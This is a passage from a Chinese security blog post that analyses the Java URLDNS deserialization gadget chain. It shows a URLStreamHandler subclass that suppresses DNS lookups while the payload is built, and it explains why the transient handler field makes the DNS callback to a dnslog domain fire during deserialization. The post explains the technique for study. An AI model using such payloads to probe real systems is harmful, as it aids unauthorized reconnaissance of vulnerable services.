+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    static class SilentURLStreamHandler extends URLStreamHandler &#123;</span><br><span class="line">        @Override</span><br><span class="line">        protected java.net.URLConnection openConnection(java.net.URL u) &#123;</span><br><span class="line">            return null;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        @Override</span><br><span class="line">        protected synchronized java.net.InetAddress getHostAddress(java.net.URL u) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个类继承了URLStreamHandler，重写了两个方法，这里先说一下getHostAddress，这个方法上面说过，是将域名解析为ip，这里从写返回为null，就是为了在paylaod生成的时候不发送dns请求，也就是到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(url, dnslogDomain);</span><br></pre></td></tr></table></figure>
+
+<p>这里调用hasCode()时，hashCode还是初始设置的-1，接下来会执行<code>hashCode = handler.hashCode(this);</code>我们又重写了 getHostAddress所以不会发送dns请求，hashCode的值还是会修改。</p>
+<p>那么既然重写了getHostAddress，为什么在反序化时调用getHostAddress又会发送dns请求呢？</p>
+<p>原因就是因为关键字transient，在代码中定义了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transient URLStreamHandler handler;</span><br></pre></td></tr></table></figure>
+
+<p>序列化时不保存transient的数据。序列化时handler不会别写入数据流，那么当反序列化时，jdk就会重新获取一个系统默认的 <code>URLStreamHandler</code>此时的getHostAddress没有被重写，可以执行dns请求。</p>
+<p>重写的另一个方法时 openConnection，源代码中定义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abstract protected URLConnection openConnection(URL u) throws IOException;</span><br></pre></td></tr></table></figure>
+
+<p>只定义方法名字、参数、返回值不写具体实现，只能让子类重写，不重写代码就运行不了</p>
+<p><img src="/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415215630780.png" alt="image-20260415215630780"></p>
+<p>至此这一条链就分析完了。</p>
+
+    </div>
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+    
+        
+
+    
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/04/07/NCTF/" rel="prev" title="NCTF">
+      <i class="fa fa-chevron-left"></i> NCTF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/04/16/UNICTF2025/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">原理分析</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">程序元</p>
+  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2025 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程序元</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">418k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:20</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
